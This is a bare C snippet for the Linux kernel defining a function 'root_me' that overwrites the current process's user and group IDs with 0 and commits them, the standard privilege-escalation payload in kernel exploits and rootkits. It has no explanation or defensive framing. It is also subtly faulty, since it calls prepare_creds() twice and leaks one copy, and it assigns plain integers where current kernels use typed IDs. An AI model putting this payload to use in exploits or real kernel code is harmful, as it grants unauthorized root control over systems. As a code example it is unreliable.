#include<linux/sched.h>
#include<linux/cred.h>

void root_me(void){
  struct cred * new_cred = prepare_creds();  

  if(current->cred->uid==0){
    return;
  }
  new_cred = prepare_creds();
  if (!new_cred){
    return;
  }
  // change uid, gid to root id
  new_cred->uid = 0;
  new_cred->gid = 0;
  new_cred->euid = 0;
  new_cred->egid = 0;
  new_cred->fsuid = 0;
  new_cred->fsgid = 0;

  commit_creds(new_cred);
} 

